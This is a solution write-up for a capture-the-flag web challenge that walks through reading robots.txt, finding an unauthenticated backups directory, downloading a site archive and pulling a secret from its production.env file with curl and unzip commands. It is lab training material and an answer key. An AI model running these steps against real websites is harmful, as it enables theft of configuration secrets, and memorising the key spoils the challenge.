# WEB-01 — Complete Solution (spoilers)

Replace `TARGET` with the instance entry shown by GZ::CTF
(for example `http://172.19.0.3:32775` or the public host shown to players).

## 1. Reconnaissance

```bash
TARGET=http://172.19.0.3:32775

# the site looks like an ordinary corporate website
curl -s "$TARGET/" | head -40

# robots.txt is the intended clue
curl -s "$TARGET/robots.txt"
```

Expected:

```
User-agent: *
Allow: /

# Internal areas excluded from indexing
Disallow: /backups/
Disallow: /admin/
```

## 2. Discover the exposed directory

```bash
curl -s "$TARGET/backups/"
```

The listing shows `northstar-site-backup.zip` with its size and modification
date. It is served without authentication.

## 3. Download and extract

```bash
curl -s -o northstar-site-backup.zip "$TARGET/backups/northstar-site-backup.zip"
unzip -l northstar-site-backup.zip
```

Expected contents:

```
config/production.env
package.json
src/server.js
public/index.html
public/style.css
public/app.js
public/robots.txt
public/favicon.svg
```

```bash
unzip -o northstar-site-backup.zip
grep CTF_FLAG config/production.env
```

Expected (example from the executed validation run):

```
CTF_FLAG=AXUM{forgotten_backup_69bebdd3f044}
```

## 4. One-liner

```bash
curl -s "$TARGET/backups/northstar-site-backup.zip" \
  | funzip 2>/dev/null || unzip -p /dev/stdin config/production.env
```

Portable version:

```bash
curl -s -o /tmp/b.zip "$TARGET/backups/northstar-site-backup.zip" \
  && unzip -p /tmp/b.zip config/production.env | grep CTF_FLAG
```

## 5. Submit

Submit the `AXUM{...}` value in the GZ::CTF challenge page. The platform
accepts only the value generated for the submitting team; a flag copied from
another team's instance is rejected with `WrongAnswer`.

## Notes for organizers

* Each team's archive contains exactly that team's flag; there is no shared
  archive and no cross-team access.
* If the platform recreated the instance after the player downloaded the
  archive, the previously captured flag is stale. Relaunch and download again,
  or use the new flag from the current instance.
